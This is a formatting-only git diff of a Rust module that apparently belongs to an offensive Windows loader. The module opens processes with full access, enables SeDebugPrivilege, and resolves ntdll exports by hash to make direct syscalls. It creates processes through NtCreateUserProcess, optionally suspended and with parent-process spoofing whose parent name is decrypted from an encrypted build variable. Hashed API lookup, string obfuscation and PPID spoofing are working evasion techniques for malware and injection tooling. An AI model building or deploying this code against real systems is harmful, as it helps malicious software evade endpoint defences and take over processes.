@@ -1,20 +1,20 @@
-use crate::syscall;
-use crate::ntapi::def::{PROCESS_ALL_ACCESS, CURRENT_PROCESS};
 use super::types::*;
+use crate::ntapi::def::{CURRENT_PROCESS, PROCESS_ALL_ACCESS};
+use crate::syscall;
+use crate::utils::{Handle, RslError, RslResult};
 use core::ffi::c_void;
+use ntapi::ntapi_base::*;
+use ntapi::ntpsapi::*;
+use ntapi::ntrtl::*;
 use obfstr::obfstr;
-use std::path::PathBuf;
 use std::env;
 use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
-use windows_sys::Win32::Security::*;
-use windows_sys::Win32::Foundation::LUID;
-use ntapi::ntpsapi::*;
-use ntapi::ntrtl::*;
-use ntapi::ntapi_base::*;
-use windows::Win32::Foundation::UNICODE_STRING;
+use std::path::PathBuf;
 use windows::core::PWSTR;
-use crate::utils::{RslResult, RslError, Handle};
+use windows::Win32::Foundation::UNICODE_STRING;
+use windows_sys::Win32::Foundation::LUID;
+use windows_sys::Win32::Security::*;
 
 pub fn open_process(pid: u32, access: u32) -> RslResult<isize> {
     let mut handle: isize = 0;
@@ -85,14 +85,14 @@ pub fn normalize_nt_path(target: &str) -> RslResult<String> {
     let file_name = path.file_name().and_then(|s| s.to_str()).unwrap_or("");
     if file_name.eq_ignore_ascii_case("notepad.exe") {
         path = PathBuf::from(&sys_root).join("notepad.exe");
-    } 
-    else if path.parent().map_or(true, |p| p.as_os_str().is_empty()) {
+    } else if path.parent().map_or(true, |p| p.as_os_str().is_empty()) {
         path = PathBuf::from(&sys_root).join("System32").join(target);
     }
 
-    let canonical = path.canonicalize()
-        .map_err(|e| RslError::IoError(e))?;
-    let path_str = canonical.to_str().ok_or_else(|| RslError::Other("Invalid UTF-8".to_string()))?;
+    let canonical = path.canonicalize().map_err(|e| RslError::IoError(e))?;
+    let path_str = canonical
+        .to_str()
+        .ok_or_else(|| RslError::Other("Invalid UTF-8".to_string()))?;
 
     if let Ok(kernel_path) = get_kernel_native_path(path_str) {
         return Ok(kernel_path);
@@ -104,7 +104,9 @@ pub fn normalize_nt_path(target: &str) -> RslResult<String> {
 pub fn get_kernel_native_path(path: &str) -> RslResult<String> {
     use std::fs::File;
     use std::os::windows::io::AsRawHandle;
-    use windows_sys::Win32::Storage::FileSystem::{GetFinalPathNameByHandleW, FILE_NAME_NORMALIZED, VOLUME_NAME_NT};
+    use windows_sys::Win32::Storage::FileSystem::{
+        GetFinalPathNameByHandleW, FILE_NAME_NORMALIZED, VOLUME_NAME_NT,
+    };
 
     let file = File::open(path).map_err(|e| RslError::IoError(e))?;
     let handle = file.as_raw_handle();
@@ -115,12 +117,14 @@ pub fn get_kernel_native_path(path: &str) -> RslResult<String> {
             handle as isize,
             buffer.as_mut_ptr(),
             buffer.len() as u32,
-            FILE_NAME_NORMALIZED | VOLUME_NAME_NT
+            FILE_NAME_NORMALIZED | VOLUME_NAME_NT,
         )
     };
 
     if len == 0 {
-        return Err(RslError::Other("GetFinalPathNameByHandleW failed".to_string()));
+        return Err(RslError::Other(
+            "GetFinalPathNameByHandleW failed".to_string(),
+        ));
     }
 
     let path_str = String::from_utf16_lossy(&buffer[..len as usize]);
@@ -130,7 +134,7 @@ pub fn get_kernel_native_path(path: &str) -> RslResult<String> {
 pub fn enable_debug_privilege() -> RslResult<()> {
     let mut h_token: isize = 0;
     let nt_open_token_hash = crate::dbj2_hash!(b"NtOpenProcessToken");
-    
+
     let status = unsafe {
         syscall!(
             nt_open_token_hash,
@@ -142,21 +146,27 @@ pub fn enable_debug_privilege() -> RslResult<()> {
     };
 
     if let Some(s) = status {
-        if s < 0 { return Err(RslError::NtStatus(s)); }
+        if s < 0 {
+            return Err(RslError::NtStatus(s));
+        }
     } else {
         return Err(RslError::SyscallFailed(nt_open_token_hash));
     }
 
     let token = Handle::from(h_token);
-    let mut luid = LUID { LowPart: 0, HighPart: 0 };
-    
+    let mut luid = LUID {
+        LowPart: 0,
+        HighPart: 0,
+    };
+
     unsafe {
         let priv_name = "SeDebugPrivilege\0".encode_utf16().collect::<Vec<u16>>();
         if windows_sys::Win32::Security::LookupPrivilegeValueW(
             core::ptr::null(),
             priv_name.as_ptr(),
-            &mut luid
-        ) == 0 {
+            &mut luid,
+        ) == 0
+        {
             return Err(RslError::Other("LookupPrivilegeValueW failed".to_string()));
         }
 
@@ -181,7 +191,9 @@ pub fn enable_debug_privilege() -> RslResult<()> {
         );
 
         if let Some(s) = status {
-            if s < 0 { return Err(RslError::NtStatus(s)); }
+            if s < 0 {
+                return Err(RslError::NtStatus(s));
+            }
         } else {
             return Err(RslError::SyscallFailed(nt_adjust_hash));
         }
@@ -190,10 +202,14 @@ pub fn enable_debug_privilege() -> RslResult<()> {
     Ok(())
 }
 
-pub fn create_process(target_program: &str, parent_handle: Option<isize>, suspended: bool) -> RslResult<(isize, isize)> {
+pub fn create_process(
+    target_program: &str,
+    parent_handle: Option<isize>,
+    suspended: bool,
+) -> RslResult<(isize, isize)> {
     let nt_path = normalize_nt_path(target_program)?;
     let nt_path_u16: Vec<u16> = nt_path.encode_utf16().chain(std::iter::once(0)).collect();
-    
+
     let mut image_path_unicode = UNICODE_STRING {
         Length: ((nt_path_u16.len() - 1) * 2) as u16,
         MaximumLength: (nt_path_u16.len() * 2) as u16,
@@ -201,13 +217,32 @@ pub fn create_process(target_program: &str, parent_handle: Option<isize>, suspen
     };
 
     let ntdll_hash = crate::dbj2_hash!(b"ntdll.dll");
-    let ntdll_base = unsafe { crate::syscall::common::get_loaded_module_by_hash(ntdll_hash) }.ok_or(RslError::ModuleNotFound(ntdll_hash))?;
+    let ntdll_base = unsafe { crate::syscall::common::get_loaded_module_by_hash(ntdll_hash) }
+        .ok_or(RslError::ModuleNotFound(ntdll_hash))?;
 
     let mut process_parameters: *mut c_void = core::ptr::null_mut();
     let params_status = unsafe {
-        let addr = crate::syscall::common::pe::get_export_by_hash(ntdll_base, crate::dbj2_hash!(b"RtlCreateProcessParametersEx")).ok_or(RslError::FunctionNotFound(crate::dbj2_hash!(b"RtlCreateProcessParametersEx")))?;
-        let create_params: unsafe extern "system" fn(*mut *mut c_void, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut c_void, *mut UNICODE_STRING, *mut c_void, *mut c_void, *mut c_void, u32) -> i32 = core::mem::transmute(addr);
-        
+        let addr = crate::syscall::common::pe::get_export_by_hash(
+            ntdll_base,
+            crate::dbj2_hash!(b"RtlCreateProcessParametersEx"),
+        )
+        .ok_or(RslError::FunctionNotFound(crate::dbj2_hash!(
+            b"RtlCreateProcessParametersEx"
+        )))?;
+        let create_params: unsafe extern "system" fn(
+            *mut *mut c_void,
+            *mut UNICODE_STRING,
+            *mut UNICODE_STRING,
+            *mut UNICODE_STRING,
+            *mut UNICODE_STRING,
+            *mut c_void,
+            *mut UNICODE_STRING,
+            *mut c_void,
+            *mut c_void,
+            *mut c_void,
+            u32,
+        ) -> i32 = core::mem::transmute(addr);
+
         create_params(
             &mut process_parameters,
             &mut image_path_unicode,
@@ -219,10 +254,12 @@ pub fn create_process(target_program: &str, parent_handle: Option<isize>, suspen
             core::ptr::null_mut(),
             core::ptr::null_mut(),
             core::ptr::null_mut(),
-            0x01
+            0x01,
         )
     };
-    if params_status < 0 { return Err(RslError::NtStatus(params_status)); }
+    if params_status < 0 {
+        return Err(RslError::NtStatus(params_status));
+    }
 
     let mut attrs = Vec::new();
     let image_attr_size: usize = image_path_unicode.Length as usize;
@@ -230,7 +267,9 @@ pub fn create_process(target_program: &str, parent_handle: Option<isize>, suspen
     attrs.push(PS_ATTRIBUTE {
         Attribute: PS_ATTRIBUTE_IMAGE_NAME as usize,
         Size: image_attr_size,
-        u: PS_ATTRIBUTE_u { ValuePtr: nt_path_u16.as_ptr() as *mut _ },
+        u: PS_ATTRIBUTE_u {
+            ValuePtr: nt_path_u16.as_ptr() as *mut _,
+        },
         ReturnLength: std::ptr::null_mut(),
     });
 
@@ -238,7 +277,9 @@ pub fn create_process(target_program: &str, parent_handle: Option<isize>, suspen
         attrs.push(PS_ATTRIBUTE {
             Attribute: PS_ATTRIBUTE_PARENT_PROCESS as usize,
             Size: std::mem::size_of::<usize>(),
-            u: PS_ATTRIBUTE_u { ValuePtr: h_parent as *mut _ },
+            u: PS_ATTRIBUTE_u {
+                ValuePtr: h_parent as *mut _,
+            },
             ReturnLength: std::ptr::null_mut(),
         });
     }
@@ -285,7 +326,10 @@ pub fn create_process(target_program: &str, parent_handle: Option<isize>, suspen
     };
 
     unsafe {
-        if let Some(addr) = crate::syscall::common::pe::get_export_by_hash(ntdll_base, crate::dbj2_hash!(b"RtlDestroyProcessParameters")) {
+        if let Some(addr) = crate::syscall::common::pe::get_export_by_hash(
+            ntdll_base,
+            crate::dbj2_hash!(b"RtlDestroyProcessParameters"),
+        ) {
             let destroy: unsafe extern "system" fn(*mut c_void) = core::mem::transmute(addr);
             destroy(process_parameters);
         }
@@ -294,13 +338,18 @@ pub fn create_process(target_program: &str, parent_handle: Option<isize>, suspen
     match status {
         Some(s) if s < 0 => Err(RslError::NtStatus(s)),
         Some(_) => Ok((h_process, h_thread)),
-        None => Err(RslError::SyscallFailed(crate::dbj2_hash!(b"NtCreateUserProcess"))),
+        None => Err(RslError::SyscallFailed(crate::dbj2_hash!(
+            b"NtCreateUserProcess"
+        ))),
     }
 }
 
-pub unsafe fn create_process_with_spoofing(target_program: &str, suspended: bool) -> RslResult<windows_sys::Win32::System::Threading::PROCESS_INFORMATION> {
-    use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;
+pub unsafe fn create_process_with_spoofing(
+    target_program: &str,
+    suspended: bool,
+) -> RslResult<windows_sys::Win32::System::Threading::PROCESS_INFORMATION> {
     use crate::utils::simple_decrypt;
+    use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;
 
     let _ = enable_debug_privilege();
 
@@ -309,28 +358,32 @@ pub unsafe fn create_process_with_spoofing(target_program: &str, suspended: bool
         {
             let parent_name = simple_decrypt(env!("RSL_ENCRYPTED_PARENT_PROCESS_NAME"));
             let parent_hash = crate::utils::dbj2_hash(parent_name.as_bytes());
-            
+
             match crate::syscall::common::get_process_id_by_name(parent_hash) {
-                Ok(parent_pid) => {
-                    match open_process(parent_pid, 0x001F0FFF) {
-                        Ok(h) => Some(Handle::from(h)),
-                        Err(_) => {
-                            if let Ok(_) = enable_debug_privilege() {
-                                open_process(parent_pid, 0x001F0FFF).ok().map(Handle::from)
-                            } else {
-                                None
-                            }
+                Ok(parent_pid) => match open_process(parent_pid, 0x001F0FFF) {
+                    Ok(h) => Some(Handle::from(h)),
+                    Err(_) => {
+                        if let Ok(_) = enable_debug_privilege() {
+                            open_process(parent_pid, 0x001F0FFF).ok().map(Handle::from)
+                        } else {
+                            None
                         }
                     }
-                }
+                },
                 Err(_) => None,
             }
         }
         #[cfg(not(feature = "ppid_spoofing"))]
-        { None }
+        {
+            None
+        }
     };
 
-    let (process_handle, thread_handle) = create_process(target_program, parent_handle.as_ref().map(|h| h.as_raw() as isize), suspended)?;
+    let (process_handle, thread_handle) = create_process(
+        target_program,
+        parent_handle.as_ref().map(|h| h.as_raw() as isize),
+        suspended,
+    )?;
 
     Ok(PROCESS_INFORMATION {
         hProcess: process_handle as windows_sys::Win32::Foundation::HANDLE,
